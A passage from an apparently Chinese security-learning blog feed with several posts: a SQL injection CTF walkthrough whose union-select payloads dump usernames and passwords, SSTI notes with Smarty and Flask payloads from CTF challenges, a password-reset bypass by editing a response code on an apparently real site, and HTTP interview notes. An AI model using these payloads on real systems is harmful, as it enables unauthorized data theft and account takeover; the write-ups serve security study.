alt="image-20240709202418639"></p><p>很好，接下来我们就要判断是否存在注入了，首先输入<code>?id=1&#39;</code>，看看是否会报错</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709202716109.png" alt="image-20240709202716109"></p><p>很显然，报错了，那我们就继续输入<code>?id=1&#39;--+</code>，看一看是否会正常，如果正常了，则代表存在注入点，且为字符型注入（—+在数据库中代表注释符）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709202913982.png" alt="image-20240709202913982"></p><p>从这里，我们可以发现属于字符型注入，接下来我们用<code>order by</code>看看存在几个字段</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709203131333.png" alt="image-20240709203131333"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709203146964.png" alt="image-20240709203146964"></p><p>所以字段数为3，接下来我们用联合注入进行爆出相关的数据库信息以及数据库版本<code>?id=-1&#39; union select 1,version(),database()--+</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709203425482.png" alt="image-20240709203425482"></p><p>大于5.0版本，可以使用information_schema，且数据库名称为security，所以接下来我们使用注入语句进行注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709204128138.png" alt="image-20240709204128138"></p><p>我们所需要的表名为users，所以使用users进行查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709204258190.png" alt="image-20240709204258190"></p><p>我们的敏感信息已经出现了，我们进行最后一步操作，爆出相关信息即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; UNION SELECT 1,2,group_concat(id,username,password) from users --+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709204643937.png" alt="image-20240709204643937"></p><p>成功写出这道题</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> SQL注入 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MYSQL跨库注入 </tag>
            
            <tag> ACCESS注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-Python项目</title>
      <link href="/post/d91570bf.html"/>
      <url>/post/d91570bf.html</url>
      
        <content type="html"><![CDATA[<h2 id="如何判断是Python语言开发？"><a href="#如何判断是Python语言开发？" class="headerlink" title="如何判断是Python语言开发？"></a>如何判断是Python语言开发？</h2><p>当拿到一个网站，首先要搞清楚是否是由python语言开发的，才能知道是否有python的特性漏洞，首先看中间件，看是不是用<strong>Werkzeug</strong>中间件进行搭建的，如果是，那就是python语言开发的</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/c37c14cc6136311a65a0b00e9f8832de.png" alt="c37c14cc6136311a65a0b00e9f8832de"></p><h2 id="什么是PYC文件"><a href="#什么是PYC文件" class="headerlink" title="什么是PYC文件"></a>什么是PYC文件</h2><p>PYC文件就是python文件编译后生成的字节码文件。类似于JAVA的.class文件，pyc文件经过python解释器后最终会生成机器码运行，所以pyc文件是可以跨平台部署的，一般py文件改变后，对应的pyc文件也会改变，在实战中，如果我们拿到pyc文件，可以试着拿去反编译得到python文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708212143062.png" alt="image-20240708212143062"></p><p>接下来介绍几个反编译平台</p><p><a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708212254954.png" alt="image-20240708212254954"></p><p><a href="http://tools.bugscaner.com/decompyle/">在线pyc,pyo,python,py文件反编译，目前支持python1.5到3.6版本的反编译-在线工具 (bugscaner.com)</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708221521753.png" alt="image-20240708221521753"></p><p>但是一般这种都在CTF中出现，在现实情况下很难遇到，因为很难拿到别人python跑出来的PYC文件</p><h2 id="SSTI入门"><a href="#SSTI入门" class="headerlink" title="SSTI入门"></a>SSTI入门</h2><h3 id="什么是SSTI？"><a href="#什么是SSTI？" class="headerlink" title="什么是SSTI？"></a>什么是SSTI？</h3><p>当前使用的一些框架，比如python的flask框架，PHP的tp框架，JAVA的Spring框架等一般都采用成熟的MVC模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应的Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染给用户</p><p>漏洞的成因就是服务器接受了用户的恶意输入后，未经过任何处理就将其作为Web应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致敏感信息泄露、代码执行、GetShell等问题，其影响范围主要取决于模板引擎的复杂性</p><p>凡是使用模板的地方都可能出现SSTI问题，SSTI不仅仅出现于python中，但是在CTF中，SSTI主要出现在python中进行考查，正确的来讲，SSTI不属于任何一种语言，适用于所有的模板引擎</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1344396-20200911174631687-758048107.png" alt="img"></p><h3 id="如何判断是否存在SSTI？"><a href="#如何判断是否存在SSTI？" class="headerlink" title="如何判断是否存在SSTI？"></a>如何判断是否存在SSTI？</h3><p>我们可以通过输入<code>&#123;&#123;7*7&#125;&#125;</code>观察输出的表达式是否被执行，如果被执行了，就说明存在SSTI模板注入，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1344396-20200815171519739-387170199.png" alt="img"></p><h2 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h2><h3 id="CISCN2019华东南赛区Web11"><a href="#CISCN2019华东南赛区Web11" class="headerlink" title="CISCN2019华东南赛区Web11"></a>CISCN2019华东南赛区Web11</h3><p>首先我们打开页面，可以看到如图的页面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708230543423.png" alt="image-20240708230543423"></p><p>我们往下看，可以很清楚的看见<code>Build With Smarty !</code>的字样，我们可以知道这道题主要考的就是SSTI中的Smarty模板</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/3860da4d309281adc6c424147bd7ac8f.png" alt="3860da4d309281adc6c424147bd7ac8f"></p><p>我们抓个包看看参数在哪传递进去</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708232153190.png" alt="image-20240708232153190"></p><p>我们可以看到几乎所有的参数都没有传递进去，但是有一个很可以的地方，就是它整个页面都在强调XFF，所以我们不妨大胆猜测是XFF这引起的模板注入，可以先验证一下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/f440646097293883c99f0dce2546f9ba.png" alt="f440646097293883c99f0dce2546f9ba"></p><p>很好，就是这里引起的模板注入，我们可以插入我们的执行代码，测试一下有没有过滤</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708232527466.png" alt="image-20240708232527466"></p><p>什么都没有过滤，我们直接读flag了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/14d3e1ffe11f7164e784366203502509.png" alt="14d3e1ffe11f7164e784366203502509"></p><p>成功解出这道题</p><h3 id="Shrine"><a href="#Shrine" class="headerlink" title="Shrine"></a>Shrine</h3><p>一进入页面，就看见了python源代码，可以知道是白盒测试了，直接开始一波代码审计</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708233240474.png" alt="image-20240708233240474"></p><p>看到flask就知道肯定有模板注入，关键代码<code>@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)</code>，告诉我们路径是在shrine下的，我们进行简单的测试</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708233612526.png" alt="image-20240708233612526"></p><p>很显然是存在的，我们去网上寻找一些SSTI的POC，但是要注意，本题是限制了<code>()</code>的，并且存在黑名单<code>config,self</code>，我们要想办法绕过这两个限制</p><p>通过资料的查阅，我们可以使用以下两个python内置函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for() 方法:</span><br><span class="line">url_for() 会返回视图函数对应的URL。如果定义的视图函数是带有参数的，则可以将这些参数作为命名参数传入。</span><br><span class="line">get_flashed_messages() 方法：</span><br><span class="line">返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</span><br></pre></td></tr></table></figure><p>我们先用<code>url_for.__globals__</code>查看全局变量</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708234212325.png" alt="image-20240708234212325"></p><p>我们查current_app下的config</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://dd977e47-983a-46c1-aa1b-a739d74a2742.node5.buuoj.cn:81/shrine/%7B%7Burl_for.__globals__[&#x27;current_app&#x27;].config%7D%7D</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708234424810.png" alt="image-20240708234424810"></p><p>我们成功拿到flag值</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PYC反编译 </tag>
            
            <tag> SSTI模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试版-HTTP详解（二）</title>
      <link href="/post/b10198f6.html"/>
      <url>/post/b10198f6.html</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP特性"><a href="#HTTP特性" class="headerlink" title="HTTP特性"></a>HTTP特性</h2><p>到目前为止，HTTP常见的版本有HTTP/1.1，HTTP/2.0，HTTP/3.0，不同的版本的HTTP的特性是不一样的</p><p>我们日常生活中遇到的最多的就是HTTP/1.1版本，所以接下来也都会围绕着HTTP/1.1进行讲述</p><p>HTTP/1.1最突出的优点就是简单、灵活和易于扩展、应用广泛和跨平台</p><p><strong>简单</strong>表现在HTTP的报文格式是<code>header+body</code>，头部信息也是<code>key-value</code>的简单文本形式，易于理解和使用</p><p><strong>灵活和易于扩展</strong>体现在HTTP协议里的各类请求方法、URL、状态码、头字段等每个组成部分都没有被固定死，允许开发人员进行自定义和扩充，比如HTTPS就是在HTTP与TCP层之间增加SSL/TLS安全传输层</p><p><strong>应用广泛和跨平台</strong>体现在从台式机的浏览器到手机上的各种APP，从看新闻到购物，没有一项离得开HTTP技术，且HTTP具有天然的跨平台的优势</p><p>HTTP/1.1的缺点表现在无状态和明文传输，同时还有一大缺点就是不安全</p><p><strong>无状态</strong>表现在服务器没有记忆能力，即每次都需要验证对方的身份，所以在完成具有关联性的操作的时候会非常的麻烦，梅进行一次不同的请求，服务器都要重新验证一下身份信息，导致响应速度很慢；对于无状态的问题，现在已经有了比较好的解决方案，就是使用Cookie技术。<strong>Cookie</strong>通过在请求和响应报文中写入Cookie信息来控制客户端的状态，通过携带Cookie信息，后续客户端在请求服务器的时候，服务器就可以认识了，不需要再进行复杂的身份验证</p>]]></content>
      
      
      <categories>
          
          <category> 学校课程 </category>
          
          <category> 计算机网络 </category>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> HTTP协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-JavaScript项目</title>
      <link href="/post/f70689ba.html"/>
      <url>/post/f70689ba.html</url>
      
        <content type="html"><![CDATA[<h2 id="JavaScript特点"><a href="#JavaScript特点" class="headerlink" title="JavaScript特点"></a>JavaScript特点</h2><p>想必大家都比较清楚什么是JavaScript语言，当遇见一个网页时，我们只需要按下F12，如果看到了什么app.js，这些js文件就是JavaScript语言开发的，JS语言作为比较常见的前端开发语言，他的一个很重要的特性就是代码的可读性，它不像php，java等开发语言是只有服务器才知道代码是怎样的，JS语言通过F12可以在web端查看到源代码，等同于白盒测试，我们可以更快的发现可控变量，方便我们寻找相关漏洞</p><h2 id="如何判断是否为JS代码开发？"><a href="#如何判断是否为JS代码开发？" class="headerlink" title="如何判断是否为JS代码开发？"></a>如何判断是否为JS代码开发？</h2><p>首先可以使用插件 <strong>wappalyzer</strong>，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708093322845.png" alt="image-20240708093322845"></p><p>我们的wappalyzer可以很容易的识别相关网站使用了JS库，进而可以判断这个网站是使用JavaScript进行编写的</p><p>第二种方法是看其源代码是否简单，一般使用JavaScript的网站应用的源代码都很简短，因为JavaScript可以引用已经写好的一些js文件，使得自己编写的代码就很简短，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708093938827.png" alt="image-20240708093938827"></p><p>我们可以看到，基本上很多的代码都被封装在了js文件中，用<code>&lt;script src=&quot;/xxx/xxx/xxx.js&quot;&gt;</code>的形式进行 引用</p><p>最后一种方法就是抓包，看它的Cookie中是否有connect.sid，这也是JS开发的最基本的特征</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708094218031.png" alt="image-20240708094218031"></p><p>我们也可以使用FOFA查找相关关键字去发现使用JS开发的应用，进而可以实现通杀，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/411efd7de25186c8b7eca8e2c5f3802d.png" alt="411efd7de25186c8b7eca8e2c5f3802d"></p><h2 id="JS框架"><a href="#JS框架" class="headerlink" title="JS框架"></a>JS框架</h2><p>我们日常比较常见的JS框架有vue.js和jQuery</p><p><strong>Vue.js</strong>是一个开源的渐进式JavaScript框架，用于开发交互Web用户界面和单页应用程序，通过使用HTML、CSS和JavaScript来构建应用程序界面。Vue.js的目标是通过尽可能简单的API提供反应式数据绑定和可组合视图组件的好处</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/64fa5c0328548ccda49e44cb5d1ade9c.png" alt="Vue.js"></p><p><strong>jQuery</strong>是用JavaScript编写的，该库是跨平台和跨浏览器的。这意味着可以开发可在任何操作系统或浏览器上使用的应用程序。jQuery设计的宗旨是”写更少的代码，做更多的事情“，jQuery库封装了JavaScript常用的功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理、动画设计和Ajax交互</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708144959808.png" alt="image-20240708144959808"></p><p>相关靶场可以搭建Vulhub进行复现，具体的搭建教程可以查看相关博客，这里就不再赘述，这个靶场上会更新许多漏洞，是一个复现漏洞的很好的平台</p><h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><p>首先打开我们的老朋友福利期货，点击忘记密码，进行浏览器抓包，找到实现相关功能的js包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/c2c8d88d575d599c046bd7d5802852d0.png" alt="c2c8d88d575d599c046bd7d5802852d0"></p><p>找到关键代码，发现是要状态码为200的时候会返回验证成功，并进行路由跳转</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708150029154.png" alt="image-20240708150029154"></p><p>所以我们可以进行抓包，我们先随便输入一个验证码，然后进行抓包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/83b16d7ee37d130304bba3ceac753362.png" alt="83b16d7ee37d130304bba3ceac753362"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708150807761.png" alt="image-20240708150807761"></p><p>对抓取到的数据包点击<code>Do intercept</code>，抓取他的返回包，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708150958471.png" alt="image-20240708150958471"></p><p>将<code>code:206</code>改成<code>code:200</code>，再把包放出去</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708151214822.png" alt="image-20240708151214822"></p><p>验证成功，直接跳转到密码修改的地方，造成任意密码重置漏洞</p><p>但是在重新输入新密码的时候会出现流程错误的提示，很有可能是后端加了代码进行验证，导致无法绕过</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js框架安全 </tag>
            
            <tag> 验证绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试版-HTTP详解（一）</title>
      <link href="/post/8117742e.html"/>
      <url>/post/8117742e.html</url>
      
        <content type="html"><![CDATA[<p>众所周知，计算机网络作为计算机中的一大巨头，每年面试的时候都会被问的很多，同时，作为计算机网络中最为基础的协议——HTTP协议，在面试中被问的概率是很高的。无论是面试开发岗还是安全岗，清楚的了解HTTP协议的工作流程是必不可少的，下面就将围绕几个比较常见的关于HTTP协议的面试题做出收集和知识点整理</p><h2 id="HTTP基本概念"><a href="#HTTP基本概念" class="headerlink" title="HTTP基本概念"></a>HTTP基本概念</h2><blockquote><p>HTTP是什么？</p></blockquote><p>HTTP是超文本传输协议，也就是<strong>H</strong>yper <strong>T</strong>ext <strong>T</strong>ransfer <strong>P</strong>rotocol。</p><blockquote><p>如何理解超文本传输协议？</p></blockquote><p>HTTP的名字超文本传输协议可以拆成三个部分：超文本、传输、协议</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">协议：HTTP是一个用在计算机世界的协议。它使用计算机能够理解的语言确立了一种计算机之间的交流通信的规范，以及相关的各种控制和错误处理方式</span><br><span class="line">传输：HTTP协议是一个双向协议，是一个在计算机世界里专门用来在两点之间传输数据的约定和规范</span><br><span class="line">超文本：先来理解简单额文本，互联网早期的时候只是简单的字符文字，但现在文本的涵义已经可以扩展为图片、视频、压缩包等，但是在HTTP眼中这些都只算作文本；再来理解超文本，它就是超越了普通文本的文本，它是文字、图片、视频的混合体，且含有超链接，能从一个超文本跳转到另一个超文本；HTML就是最常见的超文本，本身是纯文本文件，但是内部用很多标签定义了图片、视频等的链接，再经过浏览器的解释，呈现给我们的就是一个有文字、有画面的网页了</span><br></pre></td></tr></table></figure><p>综上所述，HTTP是一个在计算机世界里专门在两点之间传输文字、图片、音频、视频等超文本数据的约定和规范，<strong>HTTP可以在服务器和服务器之间进行传输（不一定是服务器和本地浏览器）</strong></p><blockquote><p>HTTP常见的状态码有哪些？</p></blockquote><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240706165101516.png" alt="image-20240706165101516"></p><p>1xx：提示信息，是协议处理中的一种中间状态，实际用到的比较少</p><p>2xx：表示服务器已经成功处理了客户端的请求，这是我们最希望看到的，比如喜闻乐见的200状态码</p><ul><li><strong>200 OK</strong> 是最常见的成功状态码，表示一切正常。如果是非HEAD请求，服务器返回的响应头都会有body数据。</li><li><strong>204 No Content</strong> 也是最常见的成功状态码，与200 OK基本相同，但响应头没有body数据</li><li><strong>206 Partial Content</strong> 是应用于HTTP分块下载或断点续传，表示响应返回的body数据并不是资源的全部，而是其中的一部分，也是服务器处理成功的状态</li></ul><p>3xx：表示客户端请求的资源发生了变动，需要客户端用新的URL重新发送请求获取资源</p><ul><li><strong>301 Moved Permanently</strong> 表示永久重定向，说明请求的资源已经不存在，需要改用新的URL再次访问</li><li><strong>302 Found</strong> 表示临时重定向，说明请求的资源还在，但是要用另一个URL来访问</li><li><strong>304 Not Modified</strong> 不具有跳转的含义，表示资源未修改，重定向已存在的缓冲文件，也叫做缓冲重定向，也就是告诉客户端可以继续使用缓存资源，用于缓存控制</li></ul><p>其中，301和302后面都会跟着一个Location字段，指明后续要跳转的URL，浏览器会自动重定向新的URL</p><p>4xx 表示客户端发送的报文有误，服务器无法处理</p><ul><li><strong>400 Bad Request</strong> 表示客户端请求的报文有错误，但只是一个笼统的错误</li><li><strong>403 Forbidden</strong> 表示服务器禁止访问资源，并不是客户端的请求出错，只是服务器不允许查看这部分资源</li><li><strong>404 Not Found</strong> 表示请求的资源在服务器上不存在或者未找到，所以无法提供给客户端</li></ul><p>5xx 表示客户端请求报文正确，但是服务器处理时内部发生了错误，属于服务端的错误码</p><ul><li><strong>500 Internal Server Error</strong>与 400 类型相似，是个笼统通⽤的错误码，服务器发⽣了什么错误，我们并不知道</li><li><strong>501 Not Implemented</strong> 表示客户端请求的功能还不⽀持，类似“即将开业，敬请期待”的意思</li><li><strong>502 Bad Gateway</strong> 通常是服务器作为⽹关或代理时返回的错误码，表示服务器⾃身⼯作正常，访问后端服务器发⽣了错误</li><li><strong>503 Service Unavailable</strong> 表示服务器当前很忙，暂时⽆法响应客户端，类似“⽹络服务正忙，请稍后重试”的意思</li></ul><blockquote><p>HTTP常见字段有哪些？</p></blockquote><p><strong>HOST字段</strong>：客户端发送请求时，用来指定服务器的域名</p><p>例如，当客户想要访问A网站时，其HOST字段为</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">HOST:www.A.com</span><br></pre></td></tr></table></figure><p>有了HOST字段，就可以将请求发往同一台服务器上的不同网站</p><p><strong>Content-Length字段</strong>：服务器在返回数据时，会有Content-Length字段，表明本次回应的数据长度，例如，当资源大小为1000字节时，实际上就是在告诉浏览器，本次服务器回应的数据长度是1000字节，后面的字节属于下一次回应</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Content-Length:1000</span><br></pre></td></tr></table></figure><p>由于HTTP是基于TCP传输协议进行通信的，使用TCP传输协议，就会存在“粘包”的问题，<strong>HTTP协议通过设置回车符、换行符作为HTTP头部的边界，通过Content-Length字段作为HTTP主体的边界，这两个方式都是为了解决“粘包”的问题</strong></p><p><strong>Connection字段</strong>：常用于客户端要求使用HTTP持续链接机制，以便减少TCP连接次数，方便其他请求复用；HTTP持续链接的意思是只要任意一端没有明确提出断开连接，则保持TCP的连接状态</p><p>HTTP/1.1版本的默认连接是持续连接，但是为了兼容老版本的HTTP，需要指定Connection首部字段为 Keep-Alive</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Connection:Keep-Alive</span><br></pre></td></tr></table></figure><p>如果要关闭，则改为如下</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Connection:close</span><br></pre></td></tr></table></figure><blockquote><blockquote><p>注意和TCP中的Keepalive区分开来，TCP的Keep alive也叫TCP的保活机制该功能是由内核实现的当客户端和长达一定时间没有进行数据交互时，内核为了确定该连接是否还有效，就会发送探测报文，来检测对方是否还在线，然后决定是否要关闭连接</p></blockquote></blockquote><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240707194654638.png" alt="image-20240707194654638"></p><p><strong>Content-Type字段</strong>：用于服务器回应时，告诉客户端，本次数据是什么格式</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Content-Type:text/html;Charset=utf-8</span><br></pre></td></tr></table></figure><p>上面的类型表示，发送的是网页，而且编码是UTF-8</p><p>客户端请求的时候，可以使用Accept字段表明自己可以接收哪些数据格式</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Accept:*/*</span><br></pre></td></tr></table></figure><p>上面代码表示客户端可以接收任何格式的数据</p><p><strong>Content-Encoding字段</strong>：表明数据的压缩方式，表示服务器返回的数据使用了什么压缩格式</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Content-Encoding:gzip</span><br></pre></td></tr></table></figure><p>表示服务器返回了采用gzip压缩的数据，告知客户端要用此方法解压，客户端在请求的时候，用Accept-Encoding字段说明自己可以接受哪些压缩方法</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Accept-Encoding:gzip,deflate</span><br></pre></td></tr></table></figure><h2 id="GET和POST"><a href="#GET和POST" class="headerlink" title="GET和POST"></a>GET和POST</h2><blockquote><p>GET和POST方法是安全和幂等的吗？</p></blockquote><p>先来解释一下安全和幂等是什么：</p><ul><li>在HTTP协议中，所谓的安全就是指请求方法不会破坏服务器上的资源</li><li>所谓的幂等，就是指执行相同的操作，结果都是相同的</li></ul><p>所以根据定义，GET方法是安全且幂等的，因为是<strong>只读</strong>操作，无论操作多少次，服务器上的数据都是安全的，且每次结果都是相同的。所以，<strong>可以对GET请求的数据进行缓存处理，这个缓存可以放到浏览器本身上，也可以放到代理上（如nginx），而且在浏览器中GET请求可以保存为书签</strong></p><p>POST因为是新增或者提交数据的操作，会修改服务器上的资源，所以是不安全的，且多次提交数据会创建多个资源，所以不是幂等的，浏览器一般也不会缓存POST请求</p><p>但是在实际过程中，开发者不一定会按照RFC规定的语义来实现GET和POST方法，我们既可以用GET方法来实现新增或者删除数据的请求，这样的GET方法自然不是安全和幂等的；我们也可以用POST方法来实现查询数据的请求，这样的POST方法自然就是安全和幂等的</p><p>所谓GET是安全的POST是不安全的是在服务器的角度来说，如果站在数据是否会被泄露的角度来说，GET不比POST安全，因为GET使用url进行传输，而POST使用body数据进行传播，GET数据比POST数据更容易看见，但是也不能说POST就比GET安全，因为抓个包也能看到POST的body数据</p><p>所以要避免传输过程中数据被窃取，就要使用HTTPS协议，这样所有的HTTP数据都会被加密传输，不容易受到中间人攻击</p><h2 id="HTTP的缓存技术"><a href="#HTTP的缓存技术" class="headerlink" title="HTTP的缓存技术"></a>HTTP的缓存技术</h2><blockquote><p>HTTP的缓存技术有哪些实现方式？</p></blockquote><p>对于一些重复性的HTTP请求，我们可以把这些请求-响应的数据都缓存在本地，那么下次就直接读取本地的数据，不必再通过网络获取服务器的响应了，这样的话会对性能有肉眼可见的提升</p><p>HTTP的缓存方式有两种实现方式，分别是<strong>强制缓存和协商缓存</strong></p><blockquote><p>什么是强制缓存？</p></blockquote><p>强制缓存指的是只要浏览器判断缓存没过期，则直接使用浏览器本地缓存，决定权在本地浏览器上</p><p>强制缓存是使用下面两个HTTP响应头部字段实现的，他们都用来表示资源在客户端缓存的有效期：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Cache-Control，是一个相对时间</span><br><span class="line">Expires，是一个绝对时间</span><br></pre></td></tr></table></figure><p>当两个同时拥有时，Cache-Control的优先级高于Expires，具体实现流程如下：</p><ul><li>当浏览器第一次请求访问服务器资源的时候，服务器会在返回这个资源的同时，在Response头部加上Cache-Control，Cache-Control中设置了过期时间大小；</li><li>浏览器再次请求访问该服务器的该资源时，会通过请求资源的时间与Cache-Control中设置的过期时间的大小，来计算出该资源是否过期，如果没有，则继续使用该缓存，否则重新请求服务器</li><li>服务器再次接收到请求后，会更新Resposnse头部的Cache-Control</li></ul><blockquote><p>什么是协商缓存？</p></blockquote><p>这个时候状态码304发挥了作用，状态码304是服务器告知浏览器可以使用本地缓存的资源，通常这种通过服务端告知客户端是否可以使用缓存的方式被称为协商缓存</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240707204549481.png" alt="image-20240707204549481"></p><p>上图就是一个协商缓存的过程，所以协商缓存就是与服务端协商之后，通过协商结果来判断是否使用本地缓存，协商缓存通过两种头部来实现</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">第一种：请求头部中的If-Modified-Since字段与响应头部中的Last-Modified字段实现</span><br><span class="line">响应头部中的Last-Modified：表示这个资源的最后修改时间</span><br><span class="line">请求头部中的If-Modified-Since：当资源过期了，发现响应头部中具有Last-Modified声明，则再次发起请求的时候带上Last—Modified的时间，服务器收到请求后发现有If-Modified-Since则与被请求资源的修改时间进行对比（Last-Modified），如果最后修改时间较大，说明资源被修改过，则返回最新资源，如果修改时间较小，则说明资源无新修改，响应304，使用跳转缓存</span><br><span class="line">第二种：请求头部中的If-None-Match字段与响应头部中的Etag</span><br><span class="line">这两个字段的意思是：</span><br><span class="line">响应头部中的Etag：唯一标识响应资源；</span><br><span class="line">请求头部中的If-None-Match：当资源过期时，浏览器发现响应头里有Etag，则再次向服务器发起请求时，会将请求头If-None-Match值设置为Etag的值，服务器收到请求后进行对比，如果资源没有发生变化则返回304，如果发生了变化则返回200</span><br></pre></td></tr></table></figure><p>第一种实现方法基于时间实现，第二种方法基于一个唯一标识实现的，相对来说后者可以更加准确的判断文件内容是否被修改，避免由于时间篡改而导致的不可靠问题，所以，当Etag字段和If-Modified-Since字段都存在的时候，<strong>Etag的优先级更高</strong>，下图是协商缓存的工作示意图</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240708194742382.png" alt="image-20240708194742382"></p>]]></content>
      
      
      <categories>
          
          <category> 学校课程 </category>
          
          <category> 计算机网络 </category>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> HTTP协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-JAVA安全</title>
      <link href="/post/8806c602.html"/>
      <url>/post/8806c602.html</url>
      
